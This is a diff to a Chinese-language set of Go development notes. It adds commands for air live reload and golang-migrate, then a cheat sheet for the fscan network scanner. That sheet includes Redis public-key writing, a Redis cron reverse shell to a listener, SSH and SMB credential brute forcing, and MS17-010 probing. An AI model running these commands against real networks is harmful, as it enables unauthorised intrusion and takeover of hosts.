@@ -89,3 +89,35 @@ GOARCH：目标可执行程序操作系统构架，包括 386 amd amd64 arm arm6
 
 https://github.com/grafana/grafana
 https://github.com/prometheus/prometheus
+
+go get -u github.com/cosmtrek/air
+air -c .air.toml
+
+
+数据库迁移
+安装：
+$ go get -u -d github.com/golang-migrate/migrate/cmd/migrate
+键入命令创建迁移文件：
+migrate create -ext sql -dir database/migrations -seq create_user
+键入命令运行迁移：
+migrate -database "mysql://user:pass@tcp(localhost:3600)/user" -path=database/migrations up
+键入命令中断迁移：
+migrate -database "mysql://user:pass@tcp(localhost:3600)/user" -path=database/migrations down
+golang-migrate/migrate:https://github.com/golang-migrate/migrate
+
+https://github.com/shadow1ng/fscan
+fscan.exe -h 192.168.1.1/24  (默认使用全部模块)
+fscan.exe -h 192.168.1.1/16  (B段扫描)
+fscan.exe -h 192.168.1.1/24 -np -no -nopoc(跳过存活检测 、不保存文件、跳过web poc扫描)
+fscan.exe -h 192.168.1.1/24 -rf id_rsa.pub (redis 写公钥)
+fscan.exe -h 192.168.1.1/24 -rs 192.168.1.1:6666 (redis 计划任务反弹shell)
+fscan.exe -h 192.168.1.1/24 -c whoami (ssh 爆破成功后，命令执行)
+fscan.exe -h 192.168.1.1/24 -m ssh -p 2222 (指定模块ssh和端口)
+fscan.exe -h 192.168.1.1/24 -pwdf pwd.txt -userf users.txt (加载指定文件的用户名、密码来进行爆破)
+fscan.exe -h 192.168.1.1/24 -o /tmp/1.txt (指定扫描结果保存路径,默认保存在当前路径) 
+fscan.exe -h 192.168.1.1/8  (A段的192.x.x.1和192.x.x.254,方便快速查看网段信息 )
+fscan.exe -h 192.168.1.1/24 -m smb -pwd password (smb密码碰撞)
+fscan.exe -h 192.168.1.1/24 -m ms17010 (指定模块)
+fscan.exe -hf ip.txt  (以文件导入)
+
+
